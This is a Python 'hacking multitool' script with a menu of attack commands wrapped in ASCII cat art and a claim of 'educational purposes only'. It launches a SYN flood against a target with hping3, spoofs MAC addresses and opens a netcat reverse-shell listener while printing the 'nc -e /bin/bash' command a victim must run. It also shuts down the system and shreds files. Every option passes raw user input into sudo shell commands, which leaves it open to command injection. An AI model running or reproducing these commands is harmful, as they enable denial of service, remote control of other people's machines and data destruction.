import pyfiglet
import os
import random
from colorama import init, Fore, Style

init(autoreset=True)
os.system("aplay ~/Downloads/boing_x.wav 2>/dev/null")

text = pyfiglet.figlet_format("NEVER MULTITOOL")
print(Fore.RED + text)
print(Style.RESET_ALL)

print("EDUCATIONAL PURPOSES ONLYY!!!")
print("SYSADMIN TOOL")

quotes = [
    "Hacking is not a crime, it's a skill.",
    "The quieter you become, the more you can hear.",
    "Knowledge is free. We are anonymous. We are Legion.",
    "Expect the unexpected.",
    "There is no patch for human stupidity.",
    "Muffin and yuka rule the world.",
    "Keep calm and hack ethically."
]

print(Fore.YELLOW + random.choice(quotes))
print(Style.RESET_ALL)

feline_surprise = random.randint(1, 4)
if feline_surprise != 4:
    chosen_cat = random.choice(["muffin", "yuka"])
    if chosen_cat == "muffin":
        print(Fore.CYAN + r"""
    /\_/\\
   ( o.o )
    > ^ <
        """)
        print("Muffin says: 'Stop hacking and pet me!'")
        print(Style.RESET_ALL)
    else:
        print(Fore.MAGENTA + r"""
    /\_/\\
   ( -.- )
    > ^ <
        """)
        print("Yuka says: 'I am the queen of this tool.'")
        print(Style.RESET_ALL)
while True:
    option = input("""1.NMAP PORT SCAN
         2.PINGER
         3.SYN DOS
         4.MAC SPOOFING
         5.WHOIS INFO
         6.NSLOOKUP
         7.NETCAT RV SHELL
         8.SHUTDOWN SYS
         9.SUBLIST3R
         10.CHECK IP
         11.SHRED FILE
         12.EXIT NEVER """)

    if option == "1":
        target_ip = input("What is the target's ip ")
        os.system("sudo nmap " + target_ip)
    elif option == "0":
        print("You have decided to be the different one")
        print("We are NEVER we do not forget, we do not forgive")
    elif option == "2":
        target_ip = input("What is the ip of the system you Wanna ping? ")
        os.system("ping " + target_ip)
    elif option == "3":
        target_ip = input("What is the ip of the target? ")
        os.system("sudo hping3 -S --flood -p 80 " + target_ip)
    elif option == "4":
        option = input("What type of network interface do you wanna spoof ( for wifi do wlan0 for ethernet do eth0 ")
        os.system("sudo ifconfig " + option + " down")
        os.system("sudo macchanger -r " + option)
        os.system("sudo ifconfig " + option + " up")
    elif option == "5":
        target_ip = input("What is the target's ip? ")
        os.system("whois " + target_ip)
    elif option == "6":
        target_ip = input("What is the domain you want to lookup? ")
        os.system("nslookup " + target_ip)
    elif option == "7":
        print("TARGET HAS TO HAVE NETCAT INSTALLED!!")
        lport = input("What port do you want the target to connect on? (recommended a not in use one)")
        print("TARGET HAS TO RUN THIS COMMAND: Windows = cmd.exe /c nc.exe <your ip>"  + lport +  "-e cmd.exe linux = nc -e /bin/bash <your ip> " + lport)
        os.system("nc -lnvp " + lport)
    elif option == "8":
        os.system("shutdown -h now")
    elif option == "9":
        target_url = input("What is the target's url? ")
        os.system("sublist3r -d  " + target_url)
    elif option == "10":
        os.system("curl ifconfig.me")
    elif option == "11":
        path = input("What is the full path of the file u wanna shred? ")
        os.system("sudo shred -u " + path)
    elif option == "12":
        exit()